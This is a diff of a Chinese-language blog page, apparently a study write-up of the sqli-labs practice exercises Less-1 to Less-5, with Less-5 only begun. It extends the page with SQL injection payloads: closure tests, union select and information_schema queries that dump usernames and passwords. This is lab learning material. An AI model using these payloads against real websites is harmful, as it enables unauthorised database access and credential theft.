@@ -65,6 +65,17 @@
   
   <li class="hide-on-med-and-down nav-item">
     
+    <a href="/categories/Web" class="waves-effect waves-light">
+      
+      <i class="fab fa-internet-explorer" style="zoom: 0.6;"></i>
+      
+      <span>Web</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
     <a href="/categories/Others" class="waves-effect waves-light">
       
       <i class="fa-fw fas fa-align-left" style="zoom: 0.6;"></i>
@@ -129,6 +140,17 @@
 			    <i class="fa-fw fas fa-home"></i>
 			
 			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/Web" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fab fa-internet-explorer"></i>
+			
+			Web
 		</a>
           
         </li>
@@ -319,10 +341,6 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Web/">
-                                <span class="chip bg-color">Web</span>
-                            </a>
-                        
                             <a href="/tags/SQL-Injection/">
                                 <span class="chip bg-color">SQL Injection</span>
                             </a>
@@ -335,8 +353,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E5%BD%92%E7%BA%B3%E6%80%BB%E7%BB%93/" class="post-category">
-                                归纳总结
+                            <a href="/categories/Web/" class="post-category">
+                                Web
                             </a>
                         
                     </div>
@@ -357,14 +375,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    773
+                    1.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    4 分
                 </div>
                 
 
@@ -430,7 +448,9 @@
 </li>
 </ul>
 <p>搭建环境中请使用PHP7以下的版本，MySQL使用5.5以上版本</p>
-<h3 id="实战思路"><a href="#实战思路" class="headerlink" title="实战思路"></a>实战思路</h3><h4 id="Less1"><a href="#Less1" class="headerlink" title="Less1"></a>Less1</h4><p><em>Error based - Single quotes - String 基于错误-单引号-字符串注入</em></p>
+<h3 id="实战思路"><a href="#实战思路" class="headerlink" title="实战思路"></a>实战思路</h3><h4 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h4><p>GET - Error based - Single quotes - String</p>
+<p>基于错误 - 单引号字符型</p>
+<p><img src="https://gitee.com/night7i/img/raw/master/img/20210608160351.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">排除数值型注入：
 ?id&#x3D;1&#39; and 1 &#x3D; 1 # 	&#x2F;&#x2F;页面正常回显
 ?id&#x3D;1&#39; and 1 &#x3D; 2 # 	&#x2F;&#x2F;页面正常回显
@@ -444,7 +464,7 @@
 ?id&#x3D;1&#39; order by 3 &#x2F;&#x2F;页面正常回显
 
 判断页面回显结果位置： （传入不存在的id数值）
-?id&#x3D;77&#39; union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?id&#x3D;77&#39; union select 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>在判断完基本信息后我们需要对目标数据库具体库、表、字段、数据进行猜解</p>
 <p>引入知识点：<a href="/2021/06/08/SQL%E6%B3%A8%E5%85%A5-%E5%88%A9%E7%94%A8information-schema%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%B0%E6%8D%AE">利用information_schema获取目标数据库数据</a></p>
@@ -455,23 +475,50 @@
 查看所有的数据库：
 ?id&#x3D;77&#39; union select 1,2,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/night7i/img/raw/master/img/20210608105545.png" alt="网站当前使用数据库"></p>
-<p><img src="https://gitee.com/night7i/img/raw/master/img/20210608105535.png" alt="站点所有数据库"></p>
 <p><strong>查询数据表:</strong></p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">查询当前数据库下所有的表：
+<pre class="line-numbers language-none"><code class="language-none">查询当前数据库下所有的表：
 ?id&#x3D;77&#39; union select 1,2,group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA&#x3D;database()--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/night7i/img/raw/master/img/20210608105729.png" alt="security数据库所有表"></p>
 <p><strong>查询字段:</strong></p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">查询users表内所有字段：
+<pre class="line-numbers language-none"><code class="language-none">查询users表内所有字段：
 ?id&#x3D;77&#39; union select 1,2,group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA&#x3D;database() and TABLE_NAME&#x3D;&#39;users&#39;--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/night7i/img/raw/master/img/20210608110317.png" alt="user表所有字段"></p>
 <p><strong>查询数据:</strong></p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">查询username以及password字段下所有数据：
+<pre class="line-numbers language-none"><code class="language-none">查询username以及password字段下所有数据：
 ?id&#x3D;77&#39; union select 1,group_concat(username),group_concat(password) from users--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p><img src="https://gitee.com/night7i/img/raw/master/img/20210608110628.png" alt="username、password字段所有数据"></p>
+<hr>
+<h4 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h4><p>Error based- Intiger based</p>
+<p>基于错误 -  整形</p>
+<p><img src="https://gitee.com/night7i/img/raw/master/img/20210608160529.png"></p>
+<p>这里与Less1不同的地方是变量并没有使用双引号定义，此时的变量id为整型数据</p>
+<pre class="line-numbers language-none"><code class="language-none">判断为整型注入
+1 and 1&#x3D;1		&#x2F;&#x2F;页面正常显示
+1 and 1&#x3D;2		&#x2F;&#x2F;页面无法显示<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>在确定注入类型后再用常用的步骤尝试注入即可 需要注意的就是此时传入的变量后不需要使用引号闭合</p>
+<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;77 union select 1,group_concat(username),group_concat(password) from users--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h4><p>GET - Error based- Single quotes with twist - string</p>
+<p>基于错误 -  单引号变型字符型</p>
+<p><img src="https://gitee.com/night7i/img/raw/master/img/20210608161333.png"></p>
+<p>观察注入点以及报错信息，判断注入点有括号闭合 构建SQL语句 后续步骤同上</p>
+<pre class="line-numbers language-none"><code class="language-none">判断注入点是否存在：
+?id&#x3D;1&#39;) and 1&#x3D;1 --+		&#x2F;&#x2F;页面正常显示
+?id&#x3D;1&#39;) and 1&#x3D;2 --+		&#x2F;&#x2F;页面无法显示<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h4><p>GET - Error based- Double Quotes - string</p>
+<p>基于错误 -  双引号字符型</p>
+<p><img src="https://gitee.com/night7i/img/raw/master/img/20210608191132.png" alt="image-20210608191125799"></p>
+<p>同样观察注入点，注入点参数用双引号闭合，构建闭合语句 后续步骤同上</p>
+<pre class="line-numbers language-none"><code class="language-none">判断注入点是否存在：
+?id&#x3D;1&quot;) and 1&#x3D;1 --+		&#x2F;&#x2F;页面正常显示
+?id&#x3D;1&quot;) and 1&#x3D;2 --+		&#x2F;&#x2F;页面无法显示<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h4><p>GET - Double Injection - Single Quotes - String</p>
+<p>双注入 - 单引号字符型</p>
 
                 
             </div>
@@ -535,10 +582,6 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/Web/">
-                                    <span class="chip bg-color">Web</span>
-                                </a>
                             
                                 <a href="/tags/SQL-Injection/">
                                     <span class="chip bg-color">SQL Injection</span>
@@ -611,8 +654,8 @@
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" class="post-category">
-                                    学习记录
+                            <a href="/categories/Web/" class="post-category">
+                                    Web
                                 </a>
                             
                             
@@ -621,10 +664,6 @@
                 </div>
                 
                 <div class="card-action article-tags">
-                    
-                    <a href="/tags/Web/">
-                        <span class="chip bg-color">Web</span>
-                    </a>
                     
                     <a href="/tags/SQL-Injection/">
                         <span class="chip bg-color">SQL Injection</span>
@@ -824,7 +863,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">1.3k</span>&nbsp;字
+                class="white-color">1.7k</span>&nbsp;字
             
             
             
